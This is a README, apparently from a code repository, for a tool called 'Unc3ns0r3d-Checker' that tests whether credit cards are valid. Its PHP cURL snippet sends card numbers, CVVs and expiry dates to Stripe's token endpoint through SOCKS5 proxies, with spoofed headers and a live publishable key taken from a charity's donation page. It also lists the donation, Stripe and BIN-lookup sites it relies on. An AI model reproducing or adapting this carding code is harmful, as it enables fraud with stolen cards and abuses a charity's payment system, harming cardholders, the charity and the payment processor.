<a href="http://uncensored.vzpla.net/"><img src="https://i62.servimg.com/u/f62/12/98/31/84/logo10.jpg?v=3&s=200" title="Unc3ns0r3d Checker" alt="Unc3ns0r3d Checker"></a>

# ⛔Unc3ns0r3d-Checker⛔

> Language: EN (ENGLISH)

✔ Credit card 💳 checker, based on real donation systems and stripe. 


```php
// cURL Stripe Method by ⛔UJnc3ns0r3d⛔

$nombre = datosnombre();
$apellido = datosapellido();
$email = email($nombre);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
   'Host: api.stripe.com',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0',
'Accept: application/json',
'Referer: https://js.stripe.com/v3/controller-e5a3104782ffac207edc3af004b9574b.html',
'Content-Type: application/x-www-form-urlencoded',
'Connection: keep-alive'));

curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[name]='.$nombre.'+'.$apellido.'&card[address_line1]=&card[address_city]=&card[address_zip]=10001&card[currency]=USD&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=2a88d519-e56f-467a-9c63-c361a277ff54&muid=3190efac-5abc-4dac-9a48-03367b5b0064&sid=300c2fa4-1b47-44d1-8dfa-e0eb6728f2c3&payment_user_agent=stripe.js%2Fb78d06c%3B+stripe-js-v3%2Fb78d06c&referrer=https%3A%2F%2Fsecure.avaaz.org%2Fdonate%2Fpub-iframe.php%2F%3Fcid%3D3116%26lang%3Des%26sourceUrl%3Dhttps%253A%252F%252Fsecure.avaaz.org%252Fes%252Fdonate%252F&key=pk_live_eT3tlxY6x7Nzg9eDNkMYz99F&pasted_fields=number');
```
###  SITES

- **Site Donation 1**
    - https://secure.avaaz.org/

- **Site API 1**
    - https://api.stripe.com/v1/tokens
    
- **Site BIN 1**
    - https://lookup.binlist.net/


### Files Include

- api.php

- index.php

- proxy.php
